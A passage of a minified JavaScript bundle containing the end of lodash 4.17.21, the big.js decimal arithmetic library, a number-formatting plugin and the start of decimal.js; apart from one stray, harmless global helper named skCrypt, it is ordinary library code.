                  return g;
                }),
                (Un.times = function (t, e) {
                  if ((t = ma(t)) < 1 || t > u) return [];
                  var n = l,
                    r = yn(t, l);
                  (e = ai(e)), (t -= l);
                  for (var o = Ge(r, e); ++n < t; ) e(n);
                  return o;
                }),
                (Un.toFinite = pa),
                (Un.toInteger = ma),
                (Un.toLength = ga),
                (Un.toLower = function (t) {
                  return ba(t).toLowerCase();
                }),
                (Un.toNumber = ya),
                (Un.toSafeInteger = function (t) {
                  return t ? ir(ma(t), -9007199254740991, u) : 0 === t ? t : 0;
                }),
                (Un.toString = ba),
                (Un.toUpper = function (t) {
                  return ba(t).toUpperCase();
                }),
                (Un.trim = function (e, n, r) {
                  if ((e = ba(e)) && (r || n === t)) return Ve(e);
                  if (!e || !(n = ao(n))) return e;
                  var o = un(e),
                    i = un(n);
                  return vo(o, Je(o, i), Ye(o, i) + 1).join("");
                }),
                (Un.trimEnd = function (e, n, r) {
                  if ((e = ba(e)) && (r || n === t))
                    return e.slice(0, cn(e) + 1);
                  if (!e || !(n = ao(n))) return e;
                  var o = un(e);
                  return vo(o, 0, Ye(o, un(n)) + 1).join("");
                }),
                (Un.trimStart = function (e, n, r) {
                  if ((e = ba(e)) && (r || n === t)) return e.replace(tt, "");
                  if (!e || !(n = ao(n))) return e;
                  var o = un(e);
                  return vo(o, Je(o, un(n))).join("");
                }),
                (Un.truncate = function (e, n) {
                  var r = 30,
                    o = "...";
                  if (ea(n)) {
                    var i = "separator" in n ? n.separator : i;
                    (r = "length" in n ? ma(n.length) : r),
                      (o = "omission" in n ? ao(n.omission) : o);
                  }
                  var s = (e = ba(e)).length;
                  if (en(e)) {
                    var a = un(e);
                    s = a.length;
                  }
                  if (r >= s) return e;
                  var u = r - an(o);
                  if (u < 1) return o;
                  var c = a ? vo(a, 0, u).join("") : e.slice(0, u);
                  if (i === t) return c + o;
                  if ((a && (u += c.length - u), sa(i))) {
                    if (e.slice(u).search(i)) {
                      var l,
                        d = c;
                      for (
                        i.global || (i = Tt(i.source, ba(ct.exec(i)) + "g")),
                          i.lastIndex = 0;
                        (l = i.exec(d));

                      )
                        var f = l.index;
                      c = c.slice(0, f === t ? u : f);
                    }
                  } else if (e.indexOf(ao(i), u) != u) {
                    var h = c.lastIndexOf(i);
                    h > -1 && (c = c.slice(0, h));
                  }
                  return c + o;
                }),
                (Un.unescape = function (t) {
                  return (t = ba(t)) && j.test(t) ? t.replace(K, ln) : t;
                }),
                (Un.uniqueId = function (t) {
                  var e = ++Lt;
                  return ba(t) + e;
                }),
                (Un.upperCase = Ja),
                (Un.upperFirst = Ya),
                (Un.each = bs),
                (Un.eachRight = vs),
                (Un.first = Hi),
                uu(
                  Un,
                  ((wu = {}),
                  wr(Un, function (t, e) {
                    Mt.call(Un.prototype, e) || (wu[e] = t);
                  }),
                  wu),
                  { chain: !1 }
                ),
                (Un.VERSION = "4.17.21"),
                Ie(
                  [
                    "bind",
                    "bindKey",
                    "curry",
                    "curryRight",
                    "partial",
                    "partialRight",
                  ],
                  function (t) {
                    Un[t].placeholder = Un;
                  }
                ),
                Ie(["drop", "take"], function (e, n) {
                  (Kn.prototype[e] = function (r) {
                    r = r === t ? 1 : gn(ma(r), 0);
                    var o =
                      this.__filtered__ && !n ? new Kn(this) : this.clone();
                    return (
                      o.__filtered__
                        ? (o.__takeCount__ = yn(r, o.__takeCount__))
                        : o.__views__.push({
                            size: yn(r, l),
                            type: e + (o.__dir__ < 0 ? "Right" : ""),
                          }),
                      o
                    );
                  }),
                    (Kn.prototype[e + "Right"] = function (t) {
                      return this.reverse()[e](t).reverse();
                    });
                }),
                Ie(["filter", "map", "takeWhile"], function (t, e) {
                  var n = e + 1,
                    r = 1 == n || 3 == n;
                  Kn.prototype[t] = function (t) {
                    var e = this.clone();
                    return (
                      e.__iteratees__.push({ iteratee: ai(t, 3), type: n }),
                      (e.__filtered__ = e.__filtered__ || r),
                      e
                    );
                  };
                }),
                Ie(["head", "last"], function (t, e) {
                  var n = "take" + (e ? "Right" : "");
                  Kn.prototype[t] = function () {
                    return this[n](1).value()[0];
                  };
                }),
                Ie(["initial", "tail"], function (t, e) {
                  var n = "drop" + (e ? "" : "Right");
                  Kn.prototype[t] = function () {
                    return this.__filtered__ ? new Kn(this) : this[n](1);
                  };
                }),
                (Kn.prototype.compact = function () {
                  return this.filter(ou);
                }),
                (Kn.prototype.find = function (t) {
                  return this.filter(t).head();
                }),
                (Kn.prototype.findLast = function (t) {
                  return this.reverse().find(t);
                }),
                (Kn.prototype.invokeMap = Xr(function (t, e) {
                  return "function" == typeof t
                    ? new Kn(this)
                    : this.map(function (n) {
                        return Br(n, t, e);
                      });
                })),
                (Kn.prototype.reject = function (t) {
                  return this.filter(Ns(ai(t)));
                }),
                (Kn.prototype.slice = function (e, n) {
                  e = ma(e);
                  var r = this;
                  return r.__filtered__ && (e > 0 || n < 0)
                    ? new Kn(r)
                    : (e < 0 ? (r = r.takeRight(-e)) : e && (r = r.drop(e)),
                      n !== t &&
                        (r = (n = ma(n)) < 0 ? r.dropRight(-n) : r.take(n - e)),
                      r);
                }),
                (Kn.prototype.takeRightWhile = function (t) {
                  return this.reverse().takeWhile(t).reverse();
                }),
                (Kn.prototype.toArray = function () {
                  return this.take(l);
                }),
                wr(Kn.prototype, function (e, n) {
                  var r = /^(?:filter|find|map|reject)|While$/.test(n),
                    o = /^(?:head|last)$/.test(n),
                    i = Un[o ? "take" + ("last" == n ? "Right" : "") : n],
                    s = o || /^find/.test(n);
                  i &&
                    (Un.prototype[n] = function () {
                      var n = this.__wrapped__,
                        a = o ? [1] : arguments,
                        u = n instanceof Kn,
                        c = a[0],
                        l = u || Gs(n),
                        d = function (t) {
                          var e = i.apply(Un, xe([t], a));
                          return o && f ? e[0] : e;
                        };
                      l &&
                        r &&
                        "function" == typeof c &&
                        1 != c.length &&
                        (u = l = !1);
                      var f = this.__chain__,
                        h = !!this.__actions__.length,
                        p = s && !f,
                        m = u && !h;
                      if (!s && l) {
                        n = m ? n : new Kn(this);
                        var g = e.apply(n, a);
                        return (
                          g.__actions__.push({
                            func: ps,
                            args: [d],
                            thisArg: t,
                          }),
                          new zn(g, f)
                        );
                      }
                      return p && m
                        ? e.apply(this, a)
                        : ((g = this.thru(d)),
                          p ? (o ? g.value()[0] : g.value()) : g);
                    });
                }),
                Ie(
                  ["pop", "push", "shift", "sort", "splice", "unshift"],
                  function (t) {
                    var e = Et[t],
                      n = /^(?:push|sort|unshift)$/.test(t) ? "tap" : "thru",
                      r = /^(?:pop|shift)$/.test(t);
                    Un.prototype[t] = function () {
                      var t = arguments;
                      if (r && !this.__chain__) {
                        var o = this.value();
                        return e.apply(Gs(o) ? o : [], t);
                      }
                      return this[n](function (n) {
                        return e.apply(Gs(n) ? n : [], t);
                      });
                    };
                  }
                ),
                wr(Kn.prototype, function (t, e) {
                  var n = Un[e];
                  if (n) {
                    var r = n.name + "";
                    Mt.call(En, r) || (En[r] = []),
                      En[r].push({ name: e, func: n });
                  }
                }),
                (En[qo(t, 2).name] = [{ name: "wrapper", func: t }]),
                (Kn.prototype.clone = function () {
                  var t = new Kn(this.__wrapped__);
                  return (
                    (t.__actions__ = Bo(this.__actions__)),
                    (t.__dir__ = this.__dir__),
                    (t.__filtered__ = this.__filtered__),
                    (t.__iteratees__ = Bo(this.__iteratees__)),
                    (t.__takeCount__ = this.__takeCount__),
                    (t.__views__ = Bo(this.__views__)),
                    t
                  );
                }),
                (Kn.prototype.reverse = function () {
                  if (this.__filtered__) {
                    var t = new Kn(this);
                    (t.__dir__ = -1), (t.__filtered__ = !0);
                  } else (t = this.clone()).__dir__ *= -1;
                  return t;
                }),
                (Kn.prototype.value = function () {
                  var t = this.__wrapped__.value(),
                    e = this.__dir__,
                    n = Gs(t),
                    r = e < 0,
                    o = n ? t.length : 0,
                    i = (function (t, e, n) {
                      for (var r = -1, o = n.length; ++r < o; ) {
                        var i = n[r],
                          s = i.size;
                        switch (i.type) {
                          case "drop":
                            t += s;
                            break;
                          case "dropRight":
                            e -= s;
                            break;
                          case "take":
                            e = yn(e, t + s);
                            break;
                          case "takeRight":
                            t = gn(t, e - s);
                        }
                      }
                      return { start: t, end: e };
                    })(0, o, this.__views__),
                    s = i.start,
                    a = i.end,
                    u = a - s,
                    c = r ? a : s - 1,
                    l = this.__iteratees__,
                    d = l.length,
                    f = 0,
                    h = yn(u, this.__takeCount__);
                  if (!n || (!r && o == u && h == u))
                    return ho(t, this.__actions__);
                  var p = [];
                  t: for (; u-- && f < h; ) {
                    for (var m = -1, g = t[(c += e)]; ++m < d; ) {
                      var y = l[m],
                        w = y.iteratee,
                        b = y.type,
                        v = w(g);
                      if (2 == b) g = v;
                      else if (!v) {
                        if (1 == b) continue t;
                        break t;
                      }
                    }
                    p[f++] = g;
                  }
                  return p;
                }),
                (Un.prototype.at = ms),
                (Un.prototype.chain = function () {
                  return hs(this);
                }),
                (Un.prototype.commit = function () {
                  return new zn(this.value(), this.__chain__);
                }),
                (Un.prototype.next = function () {
                  this.__values__ === t && (this.__values__ = ha(this.value()));
                  var e = this.__index__ >= this.__values__.length;
                  return {
                    done: e,
                    value: e ? t : this.__values__[this.__index__++],
                  };
                }),
                (Un.prototype.plant = function (e) {
                  for (var n, r = this; r instanceof Wn; ) {
                    var o = Wi(r);
                    (o.__index__ = 0),
                      (o.__values__ = t),
                      n ? (i.__wrapped__ = o) : (n = o);
                    var i = o;
                    r = r.__wrapped__;
                  }
                  return (i.__wrapped__ = e), n;
                }),
                (Un.prototype.reverse = function () {
                  var e = this.__wrapped__;
                  if (e instanceof Kn) {
                    var n = e;
                    return (
                      this.__actions__.length && (n = new Kn(this)),
                      (n = n.reverse()).__actions__.push({
                        func: ps,
                        args: [es],
                        thisArg: t,
                      }),
                      new zn(n, this.__chain__)
                    );
                  }
                  return this.thru(es);
                }),
                (Un.prototype.toJSON =
                  Un.prototype.valueOf =
                  Un.prototype.value =
                    function () {
                      return ho(this.__wrapped__, this.__actions__);
                    }),
                (Un.prototype.first = Un.prototype.head),
                oe &&
                  (Un.prototype[oe] = function () {
                    return this;
                  }),
                Un
              );
            })();
          de ? (((de.exports = dn)._ = dn), (le._ = dn)) : (ce._ = dn);
        }.call(mv)),
      pv.exports),
    bv = 1e6,
    vv = 1e6,
    Av = "[big.js] ",
    kv = Av + "Invalid ",
    Iv = kv + "decimal places",
    Sv = kv + "rounding mode",
    _v = Av + "Division by zero",
    Tv = {},
    Cv = void 0,
    Bv = /^-?(\d+(\.\d*)?|\.\d+)(e[+-]?\d+)?$/i;
  function Ev(t, e, n, r) {
    var o = t.c;
    if (
      (n === Cv && (n = t.constructor.RM),
      0 !== n && 1 !== n && 2 !== n && 3 !== n)
    )
      throw Error(Sv);
    if (e < 1)
      (r =
        (3 === n && (r || !!o[0])) ||
        (0 === e &&
          ((1 === n && o[0] >= 5) ||
            (2 === n && (o[0] > 5 || (5 === o[0] && (r || o[1] !== Cv))))))),
        (o.length = 1),
        r ? ((t.e = t.e - e + 1), (o[0] = 1)) : (o[0] = t.e = 0);
    else if (e < o.length) {
      if (
        ((r =
          (1 === n && o[e] >= 5) ||
          (2 === n &&
            (o[e] > 5 ||
              (5 === o[e] && (r || o[e + 1] !== Cv || 1 & o[e - 1])))) ||
          (3 === n && (r || !!o[0]))),
        (o.length = e),
        r)
      )
        for (; ++o[--e] > 9; )
          if (((o[e] = 0), 0 === e)) {
            ++t.e, o.unshift(1);
            break;
          }
      for (e = o.length; !o[--e]; ) o.pop();
    }
    return t;
  }
  function xv(t, e, n) {
    var r = t.e,
      o = t.c.join(""),
      i = o.length;
    if (e)
      o =
        o.charAt(0) +
        (i > 1 ? "." + o.slice(1) : "") +
        (r < 0 ? "e" : "e+") +
        r;
    else if (r < 0) {
      for (; ++r; ) o = "0" + o;
      o = "0." + o;
    } else if (r > 0)
      if (++r > i) for (r -= i; r--; ) o += "0";
      else r < i && (o = o.slice(0, r) + "." + o.slice(r));
    else i > 1 && (o = o.charAt(0) + "." + o.slice(1));
    return t.s < 0 && n ? "-" + o : o;
  }
  (Tv.abs = function () {
    var t = new this.constructor(this);
    return (t.s = 1), t;
  }),
    (Tv.cmp = function (t) {
      var e,
        n = this,
        r = n.c,
        o = (t = new n.constructor(t)).c,
        i = n.s,
        s = t.s,
        a = n.e,
        u = t.e;
      if (!r[0] || !o[0]) return r[0] ? i : o[0] ? -s : 0;
      if (i != s) return i;
      if (((e = i < 0), a != u)) return (a > u) ^ e ? 1 : -1;
      for (s = (a = r.length) < (u = o.length) ? a : u, i = -1; ++i < s; )
        if (r[i] != o[i]) return (r[i] > o[i]) ^ e ? 1 : -1;
      return a == u ? 0 : (a > u) ^ e ? 1 : -1;
    }),
    (Tv.div = function (t) {
      var e = this,
        n = e.constructor,
        r = e.c,
        o = (t = new n(t)).c,
        i = e.s == t.s ? 1 : -1,
        s = n.DP;
      if (s !== ~~s || s < 0 || s > bv) throw Error(Iv);
      if (!o[0]) throw Error(_v);
      if (!r[0]) return (t.s = i), (t.c = [(t.e = 0)]), t;
      var a,
        u,
        c,
        l,
        d,
        f = o.slice(),
        h = (a = o.length),
        p = r.length,
        m = r.slice(0, a),
        g = m.length,
        y = t,
        w = (y.c = []),
        b = 0,
        v = s + (y.e = e.e - t.e) + 1;
      for (y.s = i, i = v < 0 ? 0 : v, f.unshift(0); g++ < a; ) m.push(0);
      do {
        for (c = 0; c < 10; c++) {
          if (a != (g = m.length)) l = a > g ? 1 : -1;
          else
            for (d = -1, l = 0; ++d < a; )
              if (o[d] != m[d]) {
                l = o[d] > m[d] ? 1 : -1;
                break;
              }
          if (!(l < 0)) break;
          for (u = g == a ? o : f; g; ) {
            if (m[--g] < u[g]) {
              for (d = g; d && !m[--d]; ) m[d] = 9;
              --m[d], (m[g] += 10);
            }
            m[g] -= u[g];
          }
          for (; !m[0]; ) m.shift();
        }
        (w[b++] = l ? c : ++c), m[0] && l ? (m[g] = r[h] || 0) : (m = [r[h]]);
      } while ((h++ < p || m[0] !== Cv) && i--);
      return (
        w[0] || 1 == b || (w.shift(), y.e--, v--),
        b > v && Ev(y, v, n.RM, m[0] !== Cv),
        y
      );
    }),
    (Tv.eq = function (t) {
      return 0 === this.cmp(t);
    }),
    (Tv.gt = function (t) {
      return this.cmp(t) > 0;
    }),
    (Tv.gte = function (t) {
      return this.cmp(t) > -1;
    }),
    (Tv.lt = function (t) {
      return this.cmp(t) < 0;
    }),
    (Tv.lte = function (t) {
      return this.cmp(t) < 1;
    }),
    (Tv.minus = Tv.sub =
      function (t) {
        var e,
          n,
          r,
          o,
          i = this,
          s = i.constructor,
          a = i.s,
          u = (t = new s(t)).s;
        if (a != u) return (t.s = -u), i.plus(t);
        var c = i.c.slice(),
          l = i.e,
          d = t.c,
          f = t.e;
        if (!c[0] || !d[0])
          return d[0] ? (t.s = -u) : c[0] ? (t = new s(i)) : (t.s = 1), t;
        if ((a = l - f)) {
          for (
            (o = a < 0) ? ((a = -a), (r = c)) : ((f = l), (r = d)),
              r.reverse(),
              u = a;
            u--;

          )
            r.push(0);
          r.reverse();
        } else
          for (
            n = ((o = c.length < d.length) ? c : d).length, a = u = 0;
            u < n;
            u++
          )
            if (c[u] != d[u]) {
              o = c[u] < d[u];
              break;
            }
        if (
          (o && ((r = c), (c = d), (d = r), (t.s = -t.s)),
          (u = (n = d.length) - (e = c.length)) > 0)
        )
          for (; u--; ) c[e++] = 0;
        for (u = e; n > a; ) {
          if (c[--n] < d[n]) {
            for (e = n; e && !c[--e]; ) c[e] = 9;
            --c[e], (c[n] += 10);
          }
          c[n] -= d[n];
        }
        for (; 0 === c[--u]; ) c.pop();
        for (; 0 === c[0]; ) c.shift(), --f;
        return c[0] || ((t.s = 1), (c = [(f = 0)])), (t.c = c), (t.e = f), t;
      }),
    (Tv.mod = function (t) {
      var e,
        n = this,
        r = n.constructor,
        o = n.s,
        i = (t = new r(t)).s;
      if (!t.c[0]) throw Error(_v);
      return (
        (n.s = t.s = 1),
        (e = 1 == t.cmp(n)),
        (n.s = o),
        (t.s = i),
        e
          ? new r(n)
          : ((o = r.DP),
            (i = r.RM),
            (r.DP = r.RM = 0),
            (n = n.div(t)),
            (r.DP = o),
            (r.RM = i),
            this.minus(n.times(t)))
      );
    }),
    (Tv.neg = function () {
      var t = new this.constructor(this);
      return (t.s = -t.s), t;
    }),
    (Tv.plus = Tv.add =
      function (t) {
        var e,
          n,
          r,
          o = this,
          i = o.constructor;
        if (((t = new i(t)), o.s != t.s)) return (t.s = -t.s), o.minus(t);
        var s = o.e,
          a = o.c,
          u = t.e,
          c = t.c;
        if (!a[0] || !c[0])
          return c[0] || (a[0] ? (t = new i(o)) : (t.s = o.s)), t;
        if (((a = a.slice()), (e = s - u))) {
          for (
            e > 0 ? ((u = s), (r = c)) : ((e = -e), (r = a)), r.reverse();
            e--;

          )
            r.push(0);
          r.reverse();
        }
        for (
          a.length - c.length < 0 && ((r = c), (c = a), (a = r)),
            e = c.length,
            n = 0;
          e;
          a[e] %= 10
        )
          n = ((a[--e] = a[e] + c[e] + n) / 10) | 0;
        for (n && (a.unshift(n), ++u), e = a.length; 0 === a[--e]; ) a.pop();
        return (t.c = a), (t.e = u), t;
      }),
    (Tv.pow = function (t) {
      var e = this,
        n = new e.constructor("1"),
        r = n,
        o = t < 0;
      if (t !== ~~t || t < -1e6 || t > vv) throw Error(kv + "exponent");
      for (o && (t = -t); 1 & t && (r = r.times(e)), (t >>= 1); )
        e = e.times(e);
      return o ? n.div(r) : r;
    }),
    (Tv.prec = function (t, e) {
      if (t !== ~~t || t < 1 || t > bv) throw Error(kv + "precision");
      return Ev(new this.constructor(this), t, e);
    }),
    (Tv.round = function (t, e) {
      if (t === Cv) t = 0;
      else if (t !== ~~t || t < -bv || t > bv) throw Error(Iv);
      return Ev(new this.constructor(this), t + this.e + 1, e);
    }),
    (Tv.sqrt = function () {
      var t,
        e,
        n,
        r = this,
        o = r.constructor,
        i = r.s,
        s = r.e,
        a = new o("0.5");
      if (!r.c[0]) return new o(r);
      if (i < 0) throw Error(Av + "No square root");
      0 === (i = Math.sqrt(+xv(r, !0, !0))) || i === 1 / 0
        ? (((e = r.c.join("")).length + s) & 1 || (e += "0"),
          (s = (((s + 1) / 2) | 0) - (s < 0 || 1 & s)),
          (t = new o(
            ((i = Math.sqrt(e)) == 1 / 0
              ? "5e"
              : (i = i.toExponential()).slice(0, i.indexOf("e") + 1)) + s
          )))
        : (t = new o(i + "")),
        (s = t.e + (o.DP += 4));
      do {
        (n = t), (t = a.times(n.plus(r.div(n))));
      } while (n.c.slice(0, s).join("") !== t.c.slice(0, s).join(""));
      return Ev(t, (o.DP -= 4) + t.e + 1, o.RM);
    }),
    (Tv.times = Tv.mul =
      function (t) {
        var e,
          n = this,
          r = n.constructor,
          o = n.c,
          i = (t = new r(t)).c,
          s = o.length,
          a = i.length,
          u = n.e,
          c = t.e;
        if (((t.s = n.s == t.s ? 1 : -1), !o[0] || !i[0]))
          return (t.c = [(t.e = 0)]), t;
        for (
          t.e = u + c,
            s < a && ((e = o), (o = i), (i = e), (c = s), (s = a), (a = c)),
            e = new Array((c = s + a));
          c--;

        )
          e[c] = 0;
        for (u = a; u--; ) {
          for (a = 0, c = s + u; c > u; )
            (a = e[c] + i[u] * o[c - u - 1] + a),
              (e[c--] = a % 10),
              (a = (a / 10) | 0);
          e[c] = a;
        }
        for (a ? ++t.e : e.shift(), u = e.length; !e[--u]; ) e.pop();
        return (t.c = e), t;
      }),
    (Tv.toExponential = function (t, e) {
      var n = this,
        r = n.c[0];
      if (t !== Cv) {
        if (t !== ~~t || t < 0 || t > bv) throw Error(Iv);
        for (n = Ev(new n.constructor(n), ++t, e); n.c.length < t; )
          n.c.push(0);
      }
      return xv(n, !0, !!r);
    }),
    (Tv.toFixed = function (t, e) {
      var n = this,
        r = n.c[0];
      if (t !== Cv) {
        if (t !== ~~t || t < 0 || t > bv) throw Error(Iv);
        for (
          t = t + (n = Ev(new n.constructor(n), t + n.e + 1, e)).e + 1;
          n.c.length < t;

        )
          n.c.push(0);
      }
      return xv(n, !1, !!r);
    }),
    (Tv[Symbol.for("nodejs.util.inspect.custom")] =
      Tv.toJSON =
      Tv.toString =
        function () {
          var t = this,
            e = t.constructor;
          return xv(t, t.e <= e.NE || t.e >= e.PE, !!t.c[0]);
        }),
    (Tv.toNumber = function () {
      var t = +xv(this, !0, !0);
      if (!0 === this.constructor.strict && !this.eq(t.toString()))
        throw Error(Av + "Imprecise conversion");
      return t;
    }),
    (Tv.toPrecision = function (t, e) {
      var n = this,
        r = n.constructor,
        o = n.c[0];
      if (t !== Cv) {
        if (t !== ~~t || t < 1 || t > bv) throw Error(kv + "precision");
        for (n = Ev(new r(n), t, e); n.c.length < t; ) n.c.push(0);
      }
      return xv(n, t <= n.e || n.e <= r.NE || n.e >= r.PE, !!o);
    }),
    (Tv.valueOf = function () {
      var t = this,
        e = t.constructor;
      if (!0 === e.strict) throw Error(Av + "valueOf disallowed");
      return xv(t, t.e <= e.NE || t.e >= e.PE, !0);
    });
  var Pv,
    Rv = (function t() {
      function e(n) {
        var r = this;
        if (!(r instanceof e)) return n === Cv ? t() : new e(n);
        if (n instanceof e) (r.s = n.s), (r.e = n.e), (r.c = n.c.slice());
        else {
          if ("string" != typeof n) {
            if (!0 === e.strict && "bigint" != typeof n)
              throw TypeError(kv + "value");
            n = 0 === n && 1 / n < 0 ? "-0" : String(n);
          }
          !(function (t, e) {
            var n, r, o;
            if (!Bv.test(e)) throw Error(kv + "number");
            (t.s = "-" == e.charAt(0) ? ((e = e.slice(1)), -1) : 1),
              (n = e.indexOf(".")) > -1 && (e = e.replace(".", ""));
            (r = e.search(/e/i)) > 0
              ? (n < 0 && (n = r),
                (n += +e.slice(r + 1)),
                (e = e.substring(0, r)))
              : n < 0 && (n = e.length);
            for (o = e.length, r = 0; r < o && "0" == e.charAt(r); ) ++r;
            if (r == o) t.c = [(t.e = 0)];
            else {
              for (; o > 0 && "0" == e.charAt(--o); );
              for (t.e = n - r - 1, t.c = [], n = 0; r <= o; )
                t.c[n++] = +e.charAt(r++);
            }
            return t;
          })(r, n);
        }
        r.constructor = e;
      }
      return (
        (e.prototype = Tv),
        (e.DP = 20),
        (e.RM = 1),
        (e.NE = -7),
        (e.PE = 21),
        (e.strict = false),
        (e.roundDown = 0),
        (e.roundHalfUp = 1),
        (e.roundHalfEven = 2),
        (e.roundUp = 3),
        e
      );
    })(),
    Ov = { exports: {} };
  var Mv =
    (Pv ||
      ((Pv = 1),
      (function (t) {
        (window.skCrypt = function (t) {
          return function () {
            return t;
          };
        }),
          t.exports &&
            (t.exports = function (t) {
              return (
                (t.prototype.toFormat = function (t, e, n) {
                  if (!this.e && 0 !== this.e) return this.toString();
                  var r,
                    o,
                    i,
                    s,
                    a,
                    u,
                    c,
                    l,
                    d,
                    f,
                    h,
                    p,
                    m,
                    g,
                    y,
                    w = this.format || {},
                    b = this.constructor.format || {};
                  if (
                    (t != a
                      ? "object" == typeof t
                        ? ((n = t), (t = a))
                        : e != a
                        ? "object" == typeof e
                          ? ((n = e), (e = a))
                          : "object" != typeof n && (n = {})
                        : (n = {})
                      : (n = {}),
                    (l = (r = this.toFixed(t, e).split("."))[0]),
                    (d = r[1]),
                    (u = (c = this.s < 0 ? l.slice(1) : l).length),
                    (f = n.decimalSeparator) == a &&
                      (f = w.decimalSeparator) == a &&
                      (f = b.decimalSeparator) == a &&
                      (f = "."),
                    (h = n.groupSeparator) == a &&
                      (h = w.groupSeparator) == a &&
                      (h = b.groupSeparator),
                    h &&
                      ((p = n.groupSize) == a &&
                        (p = w.groupSize) == a &&
                        (p = b.groupSize) == a &&
                        (p = 0),
                      (m = n.secondaryGroupSize) == a &&
                        (m = w.secondaryGroupSize) == a &&
                        (m = b.secondaryGroupSize) == a &&
                        (m = 0),
                      m ? ((o = +m), (u -= i = +p)) : ((o = +p), (i = +m)),
                      o > 0 && u > 0))
                  ) {
                    for (s = u % o || o, l = c.substr(0, s); s < u; s += o)
                      l += h + c.substr(s, o);
                    i > 0 && (l += h + c.slice(s)), this.s < 0 && (l = "-" + l);
                  }
                  return d
                    ? ((g = n.fractionGroupSeparator) == a &&
                        (g = w.fractionGroupSeparator) == a &&
                        (g = b.fractionGroupSeparator),
                      g &&
                        ((y = n.fractionGroupSize) == a &&
                          (y = w.fractionGroupSize) == a &&
                          (y = b.fractionGroupSize) == a &&
                          (y = 0),
                        (y = +y) &&
                          (d = d.replace(
                            new RegExp("\\d{" + y + "}\\B", "g"),
                            "$&" + g
                          ))),
                      l + f + d)
                    : l;
                }),
                (t.format = {
                  decimalSeparator: ".",
                  groupSeparator: ",",
                  groupSize: 3,
                  secondaryGroupSize: 0,
                  fractionGroupSeparator: "",
                  fractionGroupSize: 0,
                }),
                t
              );
            });
      })(Ov)),
    Ov.exports);
  const Lv = Un(Mv);
  var Nv,
    Dv = 1e9,
    Uv = !0,
    qv = "[DecimalError] ",
    Wv = qv + "Invalid argument: ",
    zv = qv + "Exponent out of range: ",
    Kv = Math.floor,
    Fv = Math.pow,
    jv = /^(\d+(\.\d*)?|\.\d+)(e[+-]?\d+)?$/i,
    Gv = 1e7,
    Vv = 9007199254740991,
    Hv = Kv(1286742750677284.5),
    Xv = {};
  function Zv(t, e) {
    var n,
      r,
      o,
      i,
      s,
      a,
      u,
      c,
      l = t.constructor,
      d = l.precision;
    if (!t.s || !e.s) return e.s || (e = new l(t)), Uv ? iA(e, d) : e;
    if (
      ((u = t.d), (c = e.d), (s = t.e), (o = e.e), (u = u.slice()), (i = s - o))
    ) {
      for (
        i < 0
          ? ((r = u), (i = -i), (a = c.length))
          : ((r = c), (o = s), (a = u.length)),
          i > (a = (s = Math.ceil(d / 7)) > a ? s + 1 : a + 1) &&
            ((i = a), (r.length = 1)),
          r.reverse();
        i--;

      )
        r.push(0);
      r.reverse();
    }
    for (
      (a = u.length) - (i = c.length) < 0 &&
        ((i = a), (r = c), (c = u), (u = r)),
        n = 0;
      i;

    )
      (n = ((u[--i] = u[i] + c[i] + n) / Gv) | 0), (u[i] %= Gv);
    for (n && (u.unshift(n), ++o), a = u.length; 0 == u[--a]; ) u.pop();
    return (e.d = u), (e.e = o), Uv ? iA(e, d) : e;
  }
  function Jv(t, e, n) {
    if (t !== ~~t || t < e || t > n) throw Error(Wv + t);
  }
  function Yv(t) {
    var e,
      n,
      r,
      o = t.length - 1,
      i = "",
      s = t[0];
    if (o > 0) {
      for (i += s, e = 1; e < o; e++)
        (n = 7 - (r = t[e] + "").length) && (i += nA(n)), (i += r);
      (n = 7 - (r = (s = t[e]) + "").length) && (i += nA(n));
    } else if (0 === s) return "0";
    for (; s % 10 == 0; ) s /= 10;
    return i + s;
  }
  (Xv.absoluteValue = Xv.abs =
    function () {
      var t = new this.constructor(this);
      return t.s && (t.s = 1), t;
    }),
    (Xv.comparedTo = Xv.cmp =
      function (t) {
        var e,
          n,
          r,
          o,
          i = this;
        if (((t = new i.constructor(t)), i.s !== t.s)) return i.s || -t.s;
        if (i.e !== t.e) return (i.e > t.e) ^ (i.s < 0) ? 1 : -1;
        for (e = 0, n = (r = i.d.length) < (o = t.d.length) ? r : o; e < n; ++e)
          if (i.d[e] !== t.d[e]) return (i.d[e] > t.d[e]) ^ (i.s < 0) ? 1 : -1;
        return r === o ? 0 : (r > o) ^ (i.s < 0) ? 1 : -1;
      }),
    (Xv.decimalPlaces = Xv.dp =
      function () {
        var t = this,
          e = t.d.length - 1,
          n = 7 * (e - t.e);
        if ((e = t.d[e])) for (; e % 10 == 0; e /= 10) n--;
        return n < 0 ? 0 : n;
      }),
    (Xv.dividedBy = Xv.div =
      function (t) {
        return Qv(this, new this.constructor(t));
      }),
    (Xv.dividedToIntegerBy = Xv.idiv =
      function (t) {
        var e = this.constructor;
        return iA(Qv(this, new e(t), 0, 1), e.precision);
      }),
    (Xv.equals = Xv.eq =
      function (t) {
        return !this.cmp(t);
      }),
    (Xv.exponent = function () {
      return tA(this);
    }),
    (Xv.greaterThan = Xv.gt =
      function (t) {
        return this.cmp(t) > 0;
      }),
    (Xv.greaterThanOrEqualTo = Xv.gte =
      function (t) {
        return this.cmp(t) >= 0;
      }),
    (Xv.isInteger = Xv.isint =
      function () {
        return this.e > this.d.length - 2;
      }),
    (Xv.isNegative = Xv.isneg =
      function () {
        return this.s < 0;
      }),
    (Xv.isPositive = Xv.ispos =
      function () {
        return this.s > 0;
      }),
    (Xv.isZero = function () {
      return 0 === this.s;
    }),
    (Xv.lessThan = Xv.lt =
      function (t) {
        return this.cmp(t) < 0;
      }),
    (Xv.lessThanOrEqualTo = Xv.lte =
      function (t) {
        return this.cmp(t) < 1;
      }),
    (Xv.logarithm = Xv.log =
      function (t) {
        var e,
          n = this,
          r = n.constructor,
          o = r.precision,
          i = o + 5;
        if (void 0 === t) t = new r(10);
        else if ((t = new r(t)).s < 1 || t.eq(Nv)) throw Error(qv + "NaN");
        if (n.s < 1) throw Error(qv + (n.s ? "NaN" : "-Infinity"));
        return n.eq(Nv)
          ? new r(0)
          : ((Uv = !1), (e = Qv(rA(n, i), rA(t, i), i)), (Uv = !0), iA(e, o));
      }),
    (Xv.minus = Xv.sub =
      function (t) {
        var e = this;
        return (
          (t = new e.constructor(t)),
          e.s == t.s ? sA(e, t) : Zv(e, ((t.s = -t.s), t))
        );
      }),
    (Xv.modulo = Xv.mod =
      function (t) {
        var e,
          n = this,
          r = n.constructor,
          o = r.precision;
        if (!(t = new r(t)).s) throw Error(qv + "NaN");
        return n.s
          ? ((Uv = !1), (e = Qv(n, t, 0, 1).times(t)), (Uv = !0), n.minus(e))
          : iA(new r(n), o);
      }),
